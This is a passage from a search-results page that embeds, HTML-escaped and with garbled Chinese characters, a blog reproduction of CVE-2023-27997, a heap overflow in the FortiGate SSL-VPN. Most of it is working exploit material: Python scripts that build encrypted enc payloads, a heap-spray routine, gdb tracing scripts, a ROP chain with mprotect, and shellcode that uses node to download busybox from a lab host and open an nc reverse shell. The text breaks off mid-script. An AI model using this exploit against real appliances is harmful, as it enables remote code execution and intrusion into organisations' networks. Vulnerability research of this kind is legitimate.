      <span id="stat_count">0</span><span class="language" data-lan="stat">æ¡ç›¸å…³æ¡ç›®ï¼Œä½¿ç”¨äº†</span><span id="stat_times">0</span><span class="language" data-lan="stat-time">æ¯«ç§’</span>
      <hr>
    </div>
    <div class="result" id="result">
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/JJwpNhAOx/"" data-c="
          &lt;p&gt;æœ¬æ–‡å¤ç°CVE-2023-27997ï¼Œç‰ˆæœ¬v7.2.1.F-build1254&lt;br&gt;
ç¯å¢ƒæ­å»ºè§ä¸Šä¸€ç¯‡&lt;/p&gt;
&lt;h2 id=&#34;æ¼æ´ä¿¡æ¯&#34;&gt;æ¼æ´ä¿¡æ¯:&lt;/h2&gt;
&lt;p&gt;sslvpnåœ¨&lt;code&gt;/remote/hostcheck_validate&lt;/code&gt;å’Œ&lt;code&gt;/remote/logincheck&lt;/code&gt;ç«¯ç‚¹ä¸­è§£ç  URL å‚æ•°æ—¶è¿›è¡Œäº†ä¸æ­£ç¡®çš„å¤§å°æ£€æŸ¥&lt;br&gt;
è¯·æ±‚ä¸­çš„encå‚æ•°ä¼šä¼ å…¥&lt;code&gt;parse_enc_data&lt;/code&gt;ï¼Œencç»“æ„å¦‚ä¸‹å›¾åŒ…å«äº†seed, size, ciphertextä¸‰éƒ¨åˆ†&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240825194540.png&#34; alt=&#34;Pasted image 20240825194540.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;é¦–å…ˆæœ‰ä¸€ä¸ªcheckæ£€æµ‹ä¼ å…¥çš„encé•¿åº¦æ˜¯å¦å¤§äº11å¹¶ä¸”ä¸ºå¶æ•°&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;  in_len = v4;
  lenofData = v4;
  if ( v4 &amp;lt;= 11 || (v4 &amp;amp; 1) != 0 )
  {
    sub_16CFA20(a1, 8, (unsigned int)&amp;quot;enc data length invalid (%d)\n&amp;quot;, v4, v5, v6);
    return 0xFFFFFFFFLL;
  }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ»¡è¶³checkæ¡ä»¶åä¼šåˆ†é…ä¸€å—&lt;code&gt;strlen(enc)/2+1&lt;/code&gt;çš„ç¼“å†²åŒº&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;v25 = (_BYTE *)fsv_malloc(*a2, (in_len &amp;gt;&amp;gt; 1) + 1);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¹¶å°†ä¼ è¿‡å»çš„æ•°æ®è½¬æ¢ä¸º16è¿›åˆ¶å­—èŠ‚æµçš„å½¢å¼ï¼Œä¾‹å¦‚å°†&lt;code&gt;01020a0d&lt;/code&gt;å­—ç¬¦ä¸²è½¬æ¢ä¸º&lt;code&gt;\x01\x02\x0a\x0d&lt;/code&gt;å­˜å‚¨åœ¨bufferä¸­ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆbufferæŒ‰ &lt;code&gt;encé•¿åº¦/2 +1&lt;/code&gt; åˆ†é…&lt;/p&gt;
&lt;p&gt;åç»­ä¼šè¿›å…¥å¦ä¸€ä¸ªè¾¹ç•Œcheckï¼Œå°†encå‚æ•°é•¿åº¦ä¸çš„enc_sizeï¼ˆpayloadLengthï¼‰æ¯”è¾ƒï¼Œå¦‚æœä¼ å…¥çš„é•¿åº¦-5å¤§äºå®šä¹‰çš„é•¿åº¦å³å¯pass&lt;br&gt;
è¿™é‡Œæœ¬æ¥åº”è¯¥å°†åˆ†é…çš„ç¼“å†²åŒºçš„å¤§å°è·Ÿè¿™é‡Œçš„payloadLengthæ¯”è¾ƒï¼Œä½†æ˜¯å®é™…ä¸Šå°†ä¼ å…¥çš„å‚æ•°é•¿åº¦ä¸å®šä¹‰é•¿åº¦æ¯”è¾ƒï¼Œ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;if ( in_len - 5 &amp;lt;= (unsigned __int16)payloadLength )
      {
        sub_16CFA20(
          a1,
          8,
          (unsigned int)&amp;quot;invalid enc data length: %d\n&amp;quot;,
          (unsigned __int16)payloadLength,
          (unsigned __int16)payloadLength,
          v10);
        return 1LL;
      }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ„é€ å †å—å¤§å°&amp;lt;payloadLength&amp;lt;in_len-5å¯ä»¥ç»•è¿‡ifè¿›å…¥æ¼æ´åˆ©ç”¨å¤„ï¼Œç”±äºpayloadLengthå¤§äºå †å—å¤§å°ï¼Œå¯ä»¥è¶Šç•Œå†™ï¼Œä¸è¿‡æ¯æ¬¡xorä¼šæœ‰è„æ•°æ®&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;        v16 = v12 + 6;
        v25 = v16;
        if ( (_WORD)payloadLength )
        {
          v17 = (unsigned int)(unsigned __int16)payloadLength - 1;
          v18 = 0LL;
          v19 = 2;
          while ( 1 )
          {
            v16[v18] ^= v28[v19];
            if ( v17 == v18 )
              break;
            v19 = ((_BYTE)v18 + 3) &amp;amp; 0xF;
            if ( (((_BYTE)v18 + 3) &amp;amp; 0xF) == 0 )
            {
              v24 = payloadLength;
              MD5_Init(v27);
              MD5_Update(v27, v28, 16LL);
              MD5_Final(v28, v27);
              payloadLength = v24;
            }
            v16 = v25;
            ++v18;
          }
          v16 = &amp;amp;v25[(unsigned __int16)payloadLength];
        }
        *v16 = 0; // off-by-null
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è€Œè¿™é‡Œæ¯æ¬¡æœ«å°¾ä¼šç½®nullï¼Œè¿™ç¯‡æ–‡ç« ç»™å‡ºäº†ä¸€ä¸ªè¶Šç•Œå†™åŸè¯­:&lt;br&gt;
https://blog.lexfo.fr/xortigate-cve-2023-27997.html&lt;br&gt;
å³åˆ©ç”¨ä¸¤æ¬¡xorå€¼ä¸å˜çš„æ–¹å¼æ¥å†™æ•°æ®ï¼Œå¦‚ä¸‹å›¾&lt;br&gt;
ç¬¬ä¸€æ¬¡å†™4999å¤„çš„æ•°æ®ï¼Œä¼šåœ¨5000å¤„ç½®0&lt;br&gt;
ç¬¬äºŒæ¬¡åœ¨5000å¤„è¿›è¡Œxorçš„æ—¶å€™å°±å¯ä»¥å†™æƒ³è¦çš„å­—èŠ‚ï¼Œå¹¶åœ¨5001å¤„ç½®0...&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240827165003.png&#34; alt=&#34;Pasted image 20240827165003.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨ä»¥ä¸‹payloadå‘é€ï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ª0x1000å¤§å°çš„å †å—ï¼Œæ­¤æ—¶in_lenå¤§æ¦‚æ˜¯0x1fcx&lt;br&gt;
ä¸ºäº†ä¿è¯å †å—å¤§å°&amp;lt;payloadLength&amp;lt;in_len-5ä»è€Œè§¦å‘å †æº¢å‡ºï¼Œå®šä¹‰payloadLengthå¤§å°ä¸º0x1f00&lt;br&gt;
å‘é€çš„dataé•¿åº¦æ§åˆ¶åœ¨0x1000-0x18-0x7ï¼Œ0x18ä¸ºjemallocåˆ†é…å †å—çš„æ ‡å¤´é•¿åº¦ï¼Œ0x7ä¸º4å­—èŠ‚seed+2å­—èŠ‚size+1å­—èŠ‚ç»ˆæ­¢ç¬¦ï¼Œgdbè·Ÿè¸ªä¸€ä¸‹&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import socket
import ssl
from pwn import *
from hashlib import md5


ip = &amp;quot;192.168.122.99&amp;quot;
port = 1443


path = &amp;quot;/remote/hostcheck_validate&amp;quot;.encode()


def create_ssl_ctx():
    _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    _default_context = ssl._create_unverified_context()
    _default_context.options |= ssl.OP_NO_TLSv1_3
    _socket = _default_context.wrap_socket(_socket)
    _socket.connect((ip, port))
    return _socket


def get_salt():
    sk = create_ssl_ctx()
    sk.sendall(b&amp;quot;GET /remote/info HTTP/1.1\r\nHost:&amp;quot;+ip.encode()+b&amp;quot;\r\n\r\n&amp;quot;)
    data = sk.recv(1024)
    # print(data)
    sk.close()
    salt = data[data.find(b&amp;quot;salt=&amp;quot;)+6:data.find(b&amp;quot;salt=&amp;quot;)+14]
    info(&amp;quot;salt: &amp;quot;+str(salt))
    return salt


def gen_ks(salt, seed, size):
    magic = b&#39;GCC is the GNU Compiler Collection.&#39;
    k0 = md5(salt+seed+magic).digest()
    keystream = k0
    while len(keystream) &amp;lt; size:
        k0 = md5(k0).digest()
        keystream += k0
    return keystream[:size]


def gen_enc_data(salt, seed, size, data):
    plaintext = struct.pack(&amp;quot;&amp;lt;H&amp;quot;, size) + data
    keystream = gen_ks(salt, seed, len(plaintext))
    ciphertext = bytes(x[0] ^ x[1] for x in zip(plaintext, keystream)).hex()
    return seed.decode()+ciphertext


socks = []

# get_salt()

_sk = create_ssl_ctx()

payload = b&amp;quot;enc=&amp;quot;+gen_enc_data(get_salt(),
                               b&#39;deadbeef&#39;, 0x1f00, b&#39;A&#39;*(0x1000-0x18-7)).encode()
rq = b&amp;quot;POST &amp;quot; + path + b&amp;quot; HTTP/1.1\r\nHost: 192.168.122.99\r\nContent-Length: &amp;quot; + \
    str(len(payload)).encode() + \
    b&amp;quot;\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\n&amp;quot;+payload

print(rq)

_sk.sendall(rq)

response = _sk.recv(1024)
print(response)

_sk.close()

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;éªŒè¯äº†æœ€å¼€å§‹ä¼ è¿›æ¥çš„in_lenå³&lt;code&gt;enc=&lt;/code&gt;åçš„keystreamé•¿åº¦&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240827155703.png&#34; alt=&#34;Pasted image 20240827155703.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
è·Ÿè¿›åˆ°&lt;code&gt;fsv_malloc&lt;/code&gt;å¤„ï¼Œrsié€šè¿‡ç§»ä½+1æ“ä½œä»¥åŠå˜ä¸º0xfe8&lt;br&gt;
ç„¶åå°†encå­—æ®µä¸­çš„å­—ç¬¦ä¸²æ¯2å­—èŠ‚ç»„æˆä¸€ä¸ªåå…­è¿›åˆ¶å­—èŠ‚å­˜å…¥&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;pwndbg&amp;gt; x/10gx 0x7f146c302018
0x7f146c302018: 0x6665656264616564      0x6437316561396532
0x7f146c302028: 0x3432623766346433      0x3065356531616161
0x7f146c302038: 0x6565653262653862      0x3734363738343436
0x7f146c302048: 0x3562623530356363      0x3535396430383531
0x7f146c302058: 0x6365636632396136      0x3238656537393536
pwndbg&amp;gt; x/10gx 0x7f146c2f3018
0x7f146c2f3018: 0x7de19a2eefbeadde      0xe0e5a1aa247b4f3d
0x7f146c2f3028: 0x47764864ee2eebb8      0x55d98015b55b50cc
0x7f146c2f3038: 0x82ee9765ecfc926a      0x6a0252dd8edeb094
0x7f146c2f3048: 0x069d945198969402      0x2d92992b0498576c
0x7f146c2f3058: 0xa90995f0ee049316      0x6568631231fde5d8
pwndbg&amp;gt; x/10bs 0x7f146c302018
0x7f146c302018: &amp;quot;deadbeef2e9ae17d3d4f7b24aaa1e5e0b8eb2eee64487647cc505bb51580d9556a92fcec6597ee8294b0de8edd52026a0294969851949d066c5798042b99922d169304eef09509a9d8e5fd311295c1d20b1cd41fa5315cdf9cda14447ab341f6e1c3d1bf&amp;quot;...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åˆ†é…å †å—ä½äº&lt;code&gt;0x7f146c2f3000&lt;/code&gt;å¤„ï¼Œå¤§å°0x1000 bytes&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;pwndbg&amp;gt; x/10gx 0x7f146c2f3000
0x7f146c2f3000: 0x00007f146c2f4000      0x0000000000000000
0x7f146c2f3010: 0x00007f146c2f4000      0x7de19a2eefbeadde
0x7f146c2f3020: 0xe0e5a1aa247b4f3d      0x47764864ee2eebb8
0x7f146c2f3030: 0x55d98015b55b50cc      0x82ee9765ecfc926a
0x7f146c2f3040: 0x6a0252dd8edeb094      0x069d945198969402
pwndbg&amp;gt; dist 0x7f146c2f3000 0x00007f146c2f4000
0x7f146c2f3000-&amp;gt;0x7f146c2f4000 is 0x1000 bytes (0x200 words)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;æ¼æ´åˆ©ç”¨&#34;&gt;æ¼æ´åˆ©ç”¨:&lt;/h2&gt;
&lt;h3 id=&#34;å †æ’å¸ƒ&#34;&gt;å †æ’å¸ƒ:&lt;/h3&gt;
&lt;p&gt;æ–­ç‚¹ä¸‹åœ¨&lt;code&gt;SSL_new&lt;/code&gt;ä¹‹åå•æ­¥å‰è¿›ï¼Œåˆ°&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;   0x7f147197eb41     call   CRYPTO_zalloc@plt                &amp;lt;CRYPTO_zalloc@plt&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æŸ¥çœ‹å¯çŸ¥7.2.1ç‰ˆæœ¬åˆ†é…çš„sslç»“æ„ä½“å¤§å°ä¸º0x1db8&lt;br&gt;
æ ¹æ®lexfoåšå®¢ä¸­çš„æ€è·¯ï¼Œæˆ‘ä»¬è¿˜æ˜¯é€‰æ‹©å †å–·è¦†ç›–&lt;code&gt;handshake_func&lt;/code&gt;:&lt;br&gt;
https://blog.lexfo.fr/xortigate-cve-2023-27997.html&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;æ³¨æ„å †å–·éœ€è¦åœ¨ä¸€æ¬¡sslè¯·æ±‚ä¸­å®Œæˆï¼Œè¯·æ±‚å®Œæˆåä¼šé‡Šæ”¾ï¼Œä¼šå†™å…¥çš„æ•°æ®æ¸…0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä»¥7.2.1ä¸ºä¾‹ï¼Œä»¥ä¸‹ä¸ºå †å–·æ­¥éª¤:&lt;br&gt;
1. åˆ›å»ºå¤§é‡çš„socketè¿æ¥ï¼Œå¡«å……buffer&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240830151000.png&#34; alt=&#34;Pasted image 20240830151000.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
2. åœ¨å…¶ä¸­ä¸€ä¸ªsocketè¿æ¥å‘é€å¤§é‡æ•°æ®ï¼Œä½¿httpè¯·æ±‚çš„bufferé‡æ–°åˆ†é…&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240830151051.png&#34; alt=&#34;Pasted image 20240830151051.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
3. å»ºç«‹å«payloadçš„socketè¿æ¥get_saltå¹¶å‘é€ï¼Œè¯¥socketä¼šè¢«åˆ†é…åˆ°åˆšæ‰freeæ‰çš„bufferï¼Œæ­¤æ—¶å †æº¢å‡ºå†™ç»“æ„ä½“æŒ‡é’ˆ&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240830151308.png&#34; alt=&#34;Pasted image 20240830151308.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
4. å…¶ä½™socketè¿æ¥å‘é€dataï¼Œè§¦å‘å‡½æ•°æŒ‡é’ˆå¼•ç”¨&lt;/p&gt;
&lt;p&gt;è¿™é‡Œæ”¹äº†ç”¨äº†ä¸€ä¸ªåŸç”Ÿgdbçš„loggingåŠŸèƒ½ï¼Œæ‰“å°å­˜æ”¾keystreamçš„åœ°å€ï¼ˆå’Œå­˜æ”¾HTTPè¯·æ±‚çš„åœ°å€ç›¸é‚»ï¼Œå·®0x18ï¼‰ï¼Œä»¥åŠåˆ†é…sslç»“æ„ä½“çš„åœ°å€&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;target remote 192.168.122.99:23
set height 0
set pagination off
set disassembly-flavor intel
handle SIGPIPE nostop
shell rm -f ssl_chunk.txt ssl_obj.txt je_malloc.txt keystream.txt

# break after allocating the buffer grab the address
# b *0x01776baa
# commands
#     set logging file ssl_chunk.txt
#     set logging enable on
#     set $heap_obj = $rax
#     printf &amp;quot;buffer: %p\n&amp;quot;, $heap_obj
#     set logging enable off
#     c
# end
# print address of SSL objects when malloc&#39;d
b *CRYPTO_zalloc+37 if  ( $r12 == 0x1db8 )
commands
    set logging file ssl_obj.txt
    set logging enable on
    printf &amp;quot;CRYPTO_zalloc(0x%x) = %p\n&amp;quot;, $r12, $rax
    set logging enable off
    c
end

# break in je_malloc in case something calls je_malloc directly
b *0x1776baa if (($r13 ==0x2000))
commands
    set logging file je_malloc.txt
    set logging enable on
    printf &amp;quot;je_malloc(0x%x) = %p\n&amp;quot;, $r13 , $rax
    set logging enable off
    c
end

b *0x16adf15 
commands
    set logging file keystream.txt
    set logging enable on
    printf &amp;quot;keystream_loc = %p\n&amp;quot; , $rdx
    set logging enable off
    c
end
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¦‚å›¾ï¼Œæˆ‘ä»¬åœ¨å †ä¸Šå–·å°„å¤§é‡socket bufferåèƒ½å¤Ÿæº¢å‡ºåˆ°å…¶ä¸­æŸä¸€ä¸ªsslç»“æ„ä½“ï¼Œä¿®æ”¹handshakeå‡½æ•°æŒ‡é’ˆå¹¶è¦†ç›–in_initä¸º1ï¼ŒåŠ«æŒæ‰§è¡Œæµ&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240830151740.png&#34; alt=&#34;Pasted image 20240830151740.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240901233231.png&#34; alt=&#34;Pasted image 20240901233231.png&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;payloadæ„é€ &#34;&gt;payloadæ„é€ :&lt;/h3&gt;
&lt;p&gt;æ­¤åˆ»&lt;code&gt;$rdi,$rbp&lt;/code&gt;æŒ‡å‘sslç»“æ„ä½“å¼€å¤´ï¼Œç”±äºsslç»“æ„ä½“å­˜åœ¨ä¸å¯å†™åŒºåŸŸï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä»¥ä¸‹gadgetå°†æ ˆè¿ç§»åˆ°out bufferè¿›è¡Œrop&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;push_rdi_pop_rsp_ret = 0x98bed1
# 0x000000000098bed1 : push rdi ; pop rsp ; ret æ ˆè¿ç§»åˆ°sslç»“æ„ä½“èµ·å§‹åœ°å€

add_rsp_0xb8_pop_rbx_rbp_ret = 0x2a49fa3
# 0x0000000002a49fa3 : add rsp, 0xb8 ; pop rbx ; pop rbp ; ret

pop_rax_rdx_ret = 0x60bda4
# 0x000000000060bda4 : pop rax ; pop rdx ; ret 8å­—èŠ‚padding rax , rdxä¸ºssl_offset

mov_rax_rdi_sub_rax_rdx_ret = 0x14bd8cf
# 0x00000000014bd8cf : mov rax, rdi ; sub rax, rdx ; ret å–sslç»“æ„ä½“èµ·å§‹åœ°å€ç»™raxå¹¶å‡å»rdxï¼Œä½¿raxæŒ‡å‘outåŒºåŸŸ

push_rax_pop_rsp_ret = 0xe72240
# 0x0000000000e72240 : push rax ; pop rsp ; xor eax, eax ; ret  è¿æ ˆåˆ°outåŒºåŸŸ
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/Pasted%20image%2020240902163611.png&#34; alt=&#34;Pasted image 20240902163611.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
è¿™é‡Œæœ€åé‡‡ç”¨çš„æ˜¯ret2mprotectç„¶åè·³è½¬æ‰§è¡Œshellcodeï¼Œæ‰§è¡Œ&lt;code&gt;execlp(&amp;quot;/bin/node&amp;quot;,&amp;quot;node&amp;quot;,&amp;quot;-e&amp;quot;,&amp;quot;...&amp;quot;,NULL)&lt;/code&gt;ï¼Œå³é€šè¿‡fortiosè‡ªå¸¦çš„&lt;code&gt;/bin/node&lt;/code&gt;ç¨‹åºæ‰§è¡Œåé—¨ä¸‹è½½ä»¥åŠåå¼¹shell&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from hashlib import md5
from pwn import *
import requests
import time
import ssl
import socket
context.os = &#39;linux&#39;
context.arch = &#39;amd64&#39;

ip = &amp;quot;192.168.122.99&amp;quot;
port = 1443

path = &amp;quot;/remote/hostcheck_validate&amp;quot;.encode()


def create_ssl_ctx():
    _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    _default_context = ssl._create_unverified_context()
    _default_context.options |= ssl.OP_NO_TLSv1_3
    _socket = _default_context.wrap_socket(_socket)
    _socket.connect((ip, port))
    return _socket


def get_salt(sk):
    sk.sendall(b&amp;quot;GET /remote/info HTTP/1.1\r\nHost:&amp;quot;+ip.encode()+b&amp;quot;\r\n\r\n&amp;quot;)
    data = sk.recv(1024)
    # print(data)
    # sk.close()
    salt = data[data.find(b&amp;quot;salt=&amp;quot;)+6:data.find(b&amp;quot;salt=&amp;quot;)+14]
    info(&amp;quot;salt: &amp;quot;+str(salt))
    return salt


def gen_ks(salt, seed, size):
    magic = b&#39;GCC is the GNU Compiler Collection.&#39;
    k0 = md5(salt+seed+magic).digest()
    keystream = k0
    while len(keystream) &amp;lt; size:
        k0 = md5(k0).digest()
        keystream += k0
    return keystream[:size]


def gen_enc_data(salt, seed, size, data):
    plaintext = p16(size) + data
    keystream = gen_ks(salt, seed, len(plaintext))
    ciphertext = xor(plaintext, keystream).hex()
    return seed + ciphertext.encode()


def gen_seed_for_offset(salt, offset, value):
    for i in range(0xffffff):
        seed = &amp;quot;00{0:06x}&amp;quot;.format(i).encode()
        ks = gen_ks(salt, seed, offset+1)
        if int(ks[offset]) == int(value):
            print(&amp;quot;seed found: &amp;quot;+str(seed))
            print(&amp;quot;keystream: &amp;quot;+hex(ks[offset]))
            print(&amp;quot;value: &amp;quot;+str(value))
            print(&amp;quot;offset: &amp;quot;+str(offset))
            return seed
    print(&amp;quot;keystream not found&amp;quot;)
    exit(1)


def gen_seeds_u8(salt, offset, val):
    value = p8(val)
    if val == 0:
        return [(b&#39;00bfbfbf&#39;, offset - 1), (b&#39;00bfbfbf&#39;, offset - 1)]
    s = gen_seed_for_offset(salt, offset, value[0])
    return [(s, offset - 2), (s, offset - 1)]


def gen_seeds_u64(salt, offset, val):
    value = p64(val)
    seeds = []
    n = 7
    for i in range(n, -1, -1):
        if value[i] != 0:
            s = gen_seed_for_offset(salt, offset + i, value[i])
            seeds.append((s, offset + i - 1))
            seeds.append((s, offset + i - 2))
        else:
            seeds.append((b&#39;00bfbfbf&#39;, offset + i - 1))
            seeds.append((b&#39;00bfbfbf&#39;, offset + i - 1))
    return seeds[::-1]


def gen_payload():
    # 0x15ea350  call _execlp
    shellcode = asm(&#39;&#39;&#39;
    lea rdi, [rip+arg1]
    lea rsi, [rip+arg2]
    lea rdx, [rip+arg3]
    lea rcx, [rip+arg4]
    mov r8, 0x0
    mov rax, 0x15ea350
    jmp rax

arg1:
    .string &amp;quot;/bin/node&amp;quot;

arg2:
    .string &amp;quot;node&amp;quot;
    
arg3:
    .string &amp;quot;-e&amp;quot;

arg4:
    .string &amp;quot;const http=require(&#39;http&#39;);const fs=require(&#39;fs&#39;);const {spawn}=require(&#39;child_process&#39;);const fileUrl=&#39;http://192.168.122.128:8000/busybox&#39;;const args=[&#39;nc&#39;, &#39;192.168.122.128&#39;, &#39;1234&#39;, &#39;-e&#39;, &#39;/bin/busybox&#39;, &#39;ash&#39;];const command=&#39;/bin/busybox&#39;;const create=(err) =&amp;gt; {console.log(&#39;i&#39;);};try {fs.chmod(&#39;/bin/busybox&#39;, 0o777, (err) =&amp;gt; {});} catch (err) {};try {fs.symlinkSync(&#39;/bin/busybox&#39;, &#39;/bin/nc&#39;);} catch (err) {};try {fs.unlink(&#39;/bin/nc&#39;, (err)=&amp;gt;{fs.unlink(&#39;/bin/ash&#39;, (err) =&amp;gt; {fs.symlinkSync(&#39;/bin/busybox&#39;, &#39;/bin/ash&#39;);});})}catch (err){};process.on(&#39;uncaughtException&#39;, create);const df=(url, dest) =&amp;gt; {const file=fs.createWriteStream(dest);http.get(url, (response) =&amp;gt; {response.pipe(file);file.on(&#39;finish&#39;, () =&amp;gt; {file.close(() =&amp;gt; {create();});});}).on(&#39;error&#39;, (err) =&amp;gt; {});};const executeFile=(err) =&amp;gt; {const child=spawn(command,args, {stdio: &#39;inherit&#39; });};df(fileUrl, &#39;/bin/busybox&#39;);console.log(&#39;d&#39;);create();executeFile();&amp;quot;
                    &#39;&#39;&#39;)

    push_rsp_pop_rcx_ret = 0x805b38
    # 0x0000000000805b38 : push rsp ; pop rcx ; ret ä¿®æ”¹rcxä¸ºå½“å‰æ ˆæŒ‡é’ˆ

    push_rcx_pop_rdx_ret = 0x12ce92b
    # 0x00000000012ce92b : push rcx ; pop rdx ; ret ä¿®æ”¹rdxä¸ºæ ˆæŒ‡é’ˆ

    pop_rax_ret = 0x46bb27
    # 0x000000000046bb27 : pop rax ; ret é¡µåç§»rax 0x26?

    sub_rdx_rax_mov_rax_rdx_ret = 0x285a384
    # 0x000000000285a384 : sub rdx, rax ; mov rax, rdx ; ret rdxå‡å»é¡µåç§»

    push_rdx_pop_rdi_ret = 0x257008a
    # 0x000000000257008a : push rdx ; pop rdi ; ret ä¿®æ”¹rdiä¸ºæ ˆæŒ‡é’ˆ

    pop_rsi_ret = 0x530c8e
    # 0x0000000000530c8e : pop rsi ; ret å†…å­˜å—å¤§å°

    pop_rdx_ret = 0x509372
    # 0x0000000000509372 : pop rdx ; ret protä½

    mprotect_addr = 0x43f3d0

    add_rax_rdi_ret = 0x7d4f3d
    # 0x00000000007d4f3d : add rax, rdi ; ret

    push_rax_ret = 0x43dccc
    # 0x000000000043dccc : push rax ; ret

    payload = p64(0)
    payload += p64(push_rsp_pop_rcx_ret)
    payload += p64(push_rcx_pop_rdx_ret)
    payload += p64(pop_rax_ret)
    payload += p64(0x2e+0x7e000)
    payload += p64(sub_rdx_rax_mov_rax_rdx_ret)
    payload += p64(push_rdx_pop_rdi_ret)
    payload += p64(pop_rsi_ret)
    payload += p64(0x300000)
    payload += p64(pop_rdx_ret)
    payload += p64(7)
    payload += p64(mprotect_addr)
    # payload += p64(0xdeadbeef)
    payload += p64(pop_rax_ret)
    payload += p64(0x15e+0x7e000)
    payload += p64(add_rax_rdi_ret)
    payload += p64(push_rax_ret)
    payload = payload.ljust(0x150, b&amp;quot;\x90&amp;quot;)
    payload += shellcode

    return payload.ljust(0x2000-0x18-7, b&amp;quot;A&amp;quot;)


def send_payload(_sk, salt, seed, size, data=b&#39;&#39;):
    payload = b&amp;quot;enc=&amp;quot;+gen_enc_data(salt, seed, size, data)
    rq = b&amp;quot;POST &amp;quot; + path + b&amp;quot; HTTP/1.1\r\nHost: &amp;quot;+ip.encode()+b&amp;quot;\r\nContent-Length: &amp;quot; + \
        str(len(payload)).encode() + \
        b&amp;quot;\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: keep-alive\r\nAccept: */*\r\n\r\n&amp;quot;+payload
    _sk.sendall(rq)
    # _sk.recv(1024)


tick = 33

while True:
    tick += 1
    try:
        socks = []

        for i in range(tick):
            sk = create_ssl_ctx()
            data = b&amp;quot;POST &amp;quot; + b&amp;quot;/remote/login&amp;quot; + \
                b&amp;quot; HTTP/1.1\r\nHost: &amp;quot;+ip.encode()+b&amp;quot;\r\nContent-Length: 3\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: keep-alive\r\nAccept: */*\r\n\r\na=1&amp;quot;
            sk.sendall(data)
            socks.append(sk)

        socks[-1].send(b&amp;quot;B&amp;quot;*0x2001)

        _sk = create_ssl_ctx()
        salt = get_salt(_sk)

        ssl_offset = 0x2000-0x1e+2
        handshake_func = ssl_offset + 0x30
        in_init = ssl_offset+0x64

        seed = []

        push_rdi_pop_rsp_ret = 0x98bed1
        # 0x000000000098bed1 : push rdi ; pop rsp ; ret æ ˆè¿ç§»åˆ°sslç»“æ„ä½“èµ·å§‹åœ°å€

        add_rsp_0xb8_pop_rbx_rbp_ret = 0x2a49fa3
        # 0x0000000002a49fa3 : add rsp, 0xb8 ; pop rbx ; pop rbp ; ret

        pop_rax_rdx_ret = 0x60bda4
        # 0x000000000060bda4 : pop rax ; pop rdx ; ret 8å­—èŠ‚padding rax , rdxä¸ºssl_offset

        mov_rax_rdi_sub_rax_rdx_ret = 0x14bd8cf
        # 0x00000000014bd8cf : mov rax, rdi ; sub rax, rdx ; ret å–sslç»“æ„ä½“èµ·å§‹åœ°å€ç»™raxå¹¶å‡å»rdxï¼Œä½¿raxæŒ‡å‘outåŒºåŸŸ

        push_rax_pop_rsp_ret = 0xe72240
        # 0x0000000000e72240 : push rax ; pop rsp ; xor eax, eax ; ret  è¿æ ˆåˆ°outåŒºåŸŸ

        seed.extend(gen_seeds_u64(salt, handshake_func, push_rdi_pop_rsp_ret))
        seed.extend(gen_seeds_u64(salt, ssl_offset, pop_rax_rdx_ret))
